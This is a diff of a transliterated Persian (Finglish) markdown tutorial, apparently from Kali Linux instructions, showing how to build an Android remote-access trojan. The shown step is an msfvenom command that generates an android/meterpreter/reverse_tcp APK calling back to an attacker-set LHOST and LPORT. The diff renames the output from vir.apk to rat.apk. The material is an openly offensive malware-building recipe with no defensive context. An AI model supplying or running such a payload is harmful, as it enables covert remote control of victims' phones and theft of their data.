@@ -9,7 +9,7 @@ sudo -s
 $ "LHOST" va "LPORT" ra jaygozari va enter mikonim (*=ifcongig / **= port delkhah )
 
 ```bash
-msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Desktop/vir.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Desktop/rat.apk
 ```
 
 
